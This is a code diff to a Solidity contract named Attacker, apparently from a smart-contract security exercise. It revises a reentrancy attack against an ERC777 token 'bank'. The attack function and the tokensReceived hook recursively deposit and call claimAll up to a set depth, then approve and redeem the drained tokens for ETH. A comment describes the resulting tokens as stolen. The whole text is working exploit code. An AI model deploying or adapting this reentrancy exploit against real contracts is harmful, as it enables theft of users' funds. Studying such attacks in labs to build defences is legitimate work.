@@ -37,9 +37,12 @@ contract Attacker is AccessControl, IERC777Recipient {
     function attack(uint256 amt) payable public {
         require(address(bank) != address(0), "Target bank not set");
         bank.deposit{value: amt}();
-        bank.claimAll();  // Changed from withdraw to claimAll
-        emit Recurse(depth);
-	}
+        bank.claimAll();  // This will trigger tokensReceived
+        // After getting tokens, redeem them for ETH
+        ERC777 token = bank.token();
+        token.approve(address(bank), token.balanceOf(address(this)));
+        bank.redeem(token.balanceOf(address(this)));
+    }
 
 	/*
 	   After the attack, this contract has a lot of (stolen) MCITR tokens
@@ -63,8 +66,15 @@ contract Attacker is AccessControl, IERC777Recipient {
     ) external {
         if (depth < max_depth) {
             depth++;
-            bank.deposit{value: amount}();
-            bank.claimAll();  // Changed from withdraw to claimAll
+            bank.deposit{value: address(this).balance}();  // Deposit all available ETH
+            bank.claimAll();  // This will recursively trigger tokensReceived again
+            
+            // After getting tokens, redeem them for ETH
+            if (depth == max_depth) {
+                ERC777 token = bank.token();
+                token.approve(address(bank), token.balanceOf(address(this)));
+                bank.redeem(token.balanceOf(address(this)));
+            }
         }
         depth--;
         emit Recurse(depth);
